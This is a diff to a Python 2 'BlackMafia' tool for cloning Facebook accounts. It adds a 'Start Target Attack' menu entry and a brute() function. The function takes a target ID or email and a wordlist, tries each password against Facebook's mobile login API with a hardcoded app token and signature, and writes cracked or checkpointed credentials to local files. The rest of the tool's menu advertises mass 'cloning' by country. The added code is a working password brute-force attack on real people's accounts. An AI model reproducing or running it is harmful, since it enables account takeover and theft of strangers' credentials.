@@ -63,14 +63,14 @@ logo = """
 \033[1;92m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
 \033[1;92m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
 \033[1;92m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
-\033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇\033[1;91m  ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇
-\033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇\033[1;91m  ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇
-\033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇\033[1;91m  ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇
-\033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇\033[1;91m  ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇
-\033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇\033[1;91m  ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇
-\033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇\033[1;91m  ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇
-\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇
-\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇
+\033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇
+\033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇
+\033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇
+\033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇
+\033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇
+\033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇\033[1;91m  ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
+\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
+\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
 \033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
 
 def tik():
@@ -279,8 +279,9 @@ def menu():
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96mStart Cloning Indonasia"
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;95mStart Cloning USA"
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94mStart Cloning Bangladash"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;97mBlack Mafia   Massage "
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m7.\033[1;91mAfter Cloning Data Reset"
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;92mStart Target  Attack"
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m7.\x1b[1;97mBlack Mafia   Massage "
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m8.\033[1;91mAfter Cloning Data Reset"
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;94mlogout "
 	pilih()
 
@@ -301,6 +302,10 @@ def pilih():
         elif unikers =="5":
 		mafia()
         elif unikers =="6":
+		os.system('clear')
+		print logo
+		brute()
+        elif unikers =="7":
 		os.system('clear')
 		print logo
 		print " \033[1;36;40m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Massage•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"
@@ -326,7 +331,7 @@ def pilih():
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
-	elif unikers =="7":
+	elif unikers =="8":
 		os.system('clear')
 		print logo
 		print " \033[1;36;40m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Data Reset•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"
@@ -1896,6 +1901,64 @@ def pilih_super():
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
+def brute():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(0.001)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print '\033[1;31;40m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
+        try:
+            email = raw_input('\x1b[1;91m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
+            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
+            total = open(passw, 'r')
+            total = total.readlines()
+            print '\033[1;31;40m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
+            print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
+            print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
+            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;95mPlease wait \x1b[1;97m...')
+            sandi = open(passw, 'r')
+            for pw in sandi:
+                try:
+                    pw = pw.replace('\n', '')
+                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
+                    sys.stdout.flush()
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    mpsh = json.loads(data.text)
+                    if 'access_token' in mpsh:
+                        dapat = open('Brute.txt', 'w')
+                        dapat.write(email + ' ● ' + pw + '\n')
+                        dapat.close()
+                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
+                        print 52 * '\x1b[1;93m\xe2\x95\x90'
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw
+                        keluar()
+                    else:
+                        if 'www.facebook.com' in mpsh['error_msg']:
+                            ceks = open('Brutecekpoint.txt', 'w')
+                            ceks.write(email + ' | ' + pw + '\n')
+                            ceks.close()
+                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
+                            print  "\033[1;36;40m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•."
+                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;93m:\x1b[1;92m ' + email
+                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mPassword \x1b[1;93m:\x1b[1;91m ' + pw
+                            keluar()
+                except requests.exceptions.ConnectionError:
+                    print '\x1b[1;91m[!] Connection Error'
+                    time.sleep(1)
+
+        except IOError:
+            print '\x1b[1;91m[!] File not found...'
+            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect name"""
+            pilih()
 
 if __name__ == '__main__':
 	login()
